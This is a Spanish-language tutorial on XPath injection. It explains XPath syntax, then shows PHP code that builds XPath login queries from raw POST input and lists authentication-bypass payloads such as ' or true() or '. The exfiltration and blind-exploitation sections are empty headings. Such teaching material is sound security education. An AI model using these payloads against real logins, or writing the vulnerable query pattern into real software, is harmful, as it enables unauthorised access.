# XPath Injection

## INTRODUCCION

[XML Path Language (XPath)](https://www.w3.org/TR/xpath-3/) es un lenguaje de consulta para datos [de lenguaje de marcado extensible (XML)](https://datatracker.ietf.org/doc/html/rfc5364) . Específicamente, podemos usar XPath para construir consultas XPath para datos almacenados en formato XML. Si la entrada del usuario se inserta en las consultas de XPath sin la desinfección adecuada, las vulnerabilidades [de inyección de XPath surgen de manera similar a las vulnerabilidades de inyección de SQL.](https://owasp.org/www-community/attacks/XPATH_Injection)

## COMPRENDIENDO XPATH

Consideremos el siguiente documento XML:

```xml
<?xml version="1.0" encoding="UTF-8"?>
  
<academy_modules>  
  <module>
    <title>Web Attacks</title>
    <author>21y4d</author>
    <tier difficulty="medium">2</tier>
    <category>offensive</category>
  </module>

  <!-- this is a comment -->
  <module>
    <title>Attacking Enterprise Networks</title>
    <author co-author="LTNB0B">mrb3n</author>
    <tier difficulty="medium">2</tier>
    <category>offensive</category>
  </module>
</academy_modules>
```

- Un documento XML generalmente comienza con una declaracion: `<?xml version="1.0" encoding="UTF-8"?>` (Si se omite la declaración, el analizador XML asume la versión 1.0 y la codificación UTF-8.)
- Todo documento tienen **nodos** y existe un nodo superior a todos llamado **root element node** en este caso `academy_modules`.
- Despues existen **element nodes** ``module - tier - title - category`.
- Cada elemento puede tener **attribute nodes** `co-author - difficulty`
- El documento puede tener comentarios `<!--comment-->`

Dado que los documentos XML forman una estructura de árbol, cada elemento y nodo de atributo tiene exactamente un `parent node`, mientras que cada nodo de elemento puede tener un número arbitrario de `child nodes`. Los nodos con el mismo padre se llaman `sibling nodes`. Podemos recorrer el árbol hacia arriba o hacia abajo desde un nodo determinado para determinar todos `ancestor nodes` o `descendant nodes`.

- `parent node` - **module**
- `child node` - **title**
- `sibling nodes` - **title y tier**

## CONSULTAS XPATH

Cada consulta XPath selecciona un conjunto de nodos del documento XML. Una consulta se evalúa a partir de un `context node`, que marca el punto de partida. Por lo tanto, dependiendo del nodo de contexto, una misma consulta puede tener resultados diferentes. Aquí hay una descripción general de los casos base de las consultas XPath para seleccionar nodos:

|**Consulta**|**Explicación**|
|:------:|:-------:|
|`module`|Seleccionar todos los nodos `module` secundarios del nodo de contexto|
|`/`|Seleccione el nodo raíz del documento|
|`//`|Seleccionar nodos descendientes del nodo de contexto|
|`.`|Seleccione el nodo de contexto|
|`..`|Seleccione el nodo principal del nodo de contexto|
|`@difficulty`|Seleccione el atributo `difficulty` del nodo de contexto|
|`text()`|Seleccione todos los nodos secundarios del nodo de texto del nodo de contexto|

Podemos usar estos casos base para construir consultas más complicadas. Para evitar la ambigüedad del resultado de la consulta según el nodo de contexto, **podemos comenzar nuestra consulta en la raíz del documento:**

### EJEMPLOS BASICOS

|**Consulta**|**Explicación**|
|:-----:|:-----:|
|`/academy_modules/module`|Seleccionar todos los nodos `module` secundarios del nodo `academy_modules`|
|`//module`|Seleccionar todos los nodos `module`|
|`/academy_modules//title`|Seleccionar todos los nodos `title` que son descendientes del nodo `academy_modules`|
|`/academy_modules/module/tier/@difficulty`|Seleccione el atributo `difficulty` de todos los nodos `tier` de elementos en la ruta especificada|
|`//@difficulty`|Seleccionar todos los nodos que tienen atributo `difficulty`|

>[!note]
>si una consulta comienza con `//`, la consulta se evalúa desde la raíz del documento y no en el nodo de contexto.

## PREDICADOS

Los predicados filtran el resultado de una consulta XPath similar a la cláusula `WHERE` de una consulta SQL. Los predicados son parte de la consulta XPath y se encuentran entre corchetes `[]`.

|**Consulta**|**Explicación**|
|:------:|:-------:|
|`/academy_modules/module[1]`|Seleccione el primer nodo `module` secundario del nodo `academy_modules`|
|`/academy_modules/module[position()=1]`|Equivale a la consulta anterior|
|`/academy_modules/module[last()]`|Seleccione el último nodo `module` secundario del nodo `academy_modules`|
|`/academy_modules/module[position()<3]`|Seleccione los dos primeros nodos `module` secundarios del nodo `academy_modules`|
|`//module[tier=2]/title`|Seleccione el `title` de todos los módulos donde el nodo `tier` del elemento es igual `2`|
|`//module/author[@co-author]/../title`|Seleccione el `title` de todos los módulos donde el nodo `author` tiene un atributo `co-author`|
|`//module/tier[@difficulty="medium"]/..`|Seleccione todos los módulos en los que el nodo `tier` tenga un atributo `difficulty` establecido en `medium`|

Los predicados admiten los siguientes operandos:

|**operando**|**Explicación**|
|:-----:|:------:|
|`+`|Suma|
|`-`|Sustracción|
|`*`|Multiplicación|
|`div`|División|
|`=`|Igual|
|`!=`|No es igual|
|`<`|Menos que|
|`<=`|Menor o igual|
|`>`|Mas grande que|
|`>=`|Mayor que o igual|
|`or`|lógico o|
|`and`|lógico y|
|`mod`|Módulo|

## Comodines y Unión

A veces, no nos importa el tipo de nodo en una ruta. En ese caso, podemos usar uno de los siguientes comodines:

|**Consulta**|**Explicación**|
|:----:|:-----:|
|`node()`|Coincide con cualquier nodo|
|`*`|Coincide con cualquier nodo `element`|
|`@*`|Coincide con cualquier nodo `attribute`|

### EJEMPLO DE CONSULTAS

|**Consulta**|**Explicación**|
|:-----:|:------:|
|`//*`|Seleccionar todos los nodos de elementos en el documento|
|`//module/author[@*]/..`|Seleccione todos los módulos en los que el nodo `autor` tenga al menos un atributo de cualquier tipo|
|`/*/*/title`|Seleccione todos los nodos de título que estén exactamente dos niveles por debajo de la raíz del documento|

>[!note]
>El comodín `*` coincide con cualquier nodo pero no con ningún descendiente como lo hace `//` . Por lo tanto, debemos especificar la cantidad correcta de comodines en nuestra consulta. En nuestro documento XML de ejemplo, la consulta `/*/*/title` (2 niveles abajo de la raiz) devuelve todos los títulos de los módulos, pero `/*/title` (1 nivel abajo de la raiz) no devuelve nada.

Por último, podemos combinar varias consultas XPath con el operador de unión `|` de esta manera:

|**Consulta**|**Explicación**|
|:------:|:-----:|
|`//module[tier=2]/title/text() \| //module[tier=3]/title/text()`|Seleccione el nodo `title` de todos los módulos que tiene un nodo `tier` con valores `2` y `3`|

## ATAQUES

### AUTENTICATION BYPASS

Consideremos un documento XML que almacena datos de usuario como este:

```xml
<users>
	<user>
		<name first="Kaylie" last="Grenvile"/>
		<id>1</id>
		<username>kgrenvile</username>
		<password>P@ssw0rd!</password>
	</user>
	<user>
		<name first="Admin" last="Admin"/>
		<id>2</id>
		<username>admin</username>
		<password>admin</password>
	</user>
	<user>
		<name first="Academy" last="Student"/>
		<id>3</id>
		<username>htb-stdnt</username>
		<password>Academy_student!</password>
	</user>
</users>
```

Para realizar la autenticación, la aplicación web podría ejecutar una consulta XPath como la siguiente:

```xpath
/users/user[username/text()='htb-stdnt' and password/text()='Academy_student!']
```

codigo PHP:

```php
$query = "/users/user[username/text()='" . $_POST['username'] . "' and password/text()='" . $_POST['password'] . "']";
$results = $xml->xpath($query);
```

Nuestro objetivo es eludir la autenticación inyectando un nombre de usuario y una contraseña de modo que la consulta XPath siempre se evalúe como `true`.

Hay muchos payloads segun ciertas condiciones:

|**Payload**|**Query**|**Condicion**|
|:-----:|:------:|:----:|
|`' or '1'='1`|`/users/user[username/text()='' or '1'='1' and password/text()='' or '1'='1']`|Esto da como resultado todos los usuarios del documento XML y toma el primero para loguearse|
|`admin' or '1'='1` (solo en el campo usuario)|`/users/user[username/text()='admin' or '1'='1' and password/text()='abc']`|Aqui forzamos loguearnos como el usuario **admin** (o con cualquier otro que sepamos que existe)|

En escenarios del mundo real, las contraseñas a menudo se cifran. Además, es posible que no conozcamos un nombre de usuario válido, por lo tanto, no podemos usar las cargas útiles mencionadas anteriormente.

Considere el siguiente ejemplo:

```xml
<users>
	<user>
		<name first="Kaylie" last="Grenvile"/>
		<id>1</id>
		<username>kgrenvile</username>
		<password>8a24367a1f46c141048752f2d5bbd14b</password>
	</user>
	<user>
		<name first="Admin" last="Admin"/>
		<id>2</id>
		<username>obfuscatedadminuser</username>
		<password>21232f297a57a5a743894a0e4a801fc3</password>
	</user>
	<user>
		<name first="Academy" last="Student"/>
		<id>3</id>
		<username>htb-stdnt</username>
		<password>295362c2618a05ba3899904a6a3f5bc0</password>
	</user>
</users>
```

codigo PHP ahora cifra la contraseña:

```php
$query = "/users/user[username/text()='" . $_POST['username'] . "' and password/text()='" . md5($_POST['password']) . "']";
$results = $xml->xpath($query);
```

los payloads anteriores no funcionarian, por lo que hay que usar payloads mas avanzados:

|**Payload**|**Query**|**Condicion**|
|:-----:|:------:|:----:|
|`' or true() or '`|`/users/user[username/text()='' or true() or '' and password/text()='59725b2f19656a33b3eed406531fb474']`|Provoca un universal **true** y entrariamos como el primer usuario existente|
|`' or position()=2 or '` (solo campo usuario)|`/users/user[username/text()='' or position()=2 or '' and password/text()='59725b2f19656a33b3eed406531fb474']`|Podemos iterar sobre el documento XML para entrar con un cierto usuario, en este caso como el segundo nodo usuario|
|`' or contains(.,'admin') or '`|`/users/user[username/text()='' or contains(.,'admin') or '' and password/text()='59725b2f19656a33b3eed406531fb474']`|Esta consulta devuelve todos los nodos de usuario que contienen la cadena `admin` en cualquier descendiente (para intentar ingresar como un usuario en especifico)|

### DATA EXFILTRATION

### BLIND EXPLOTATION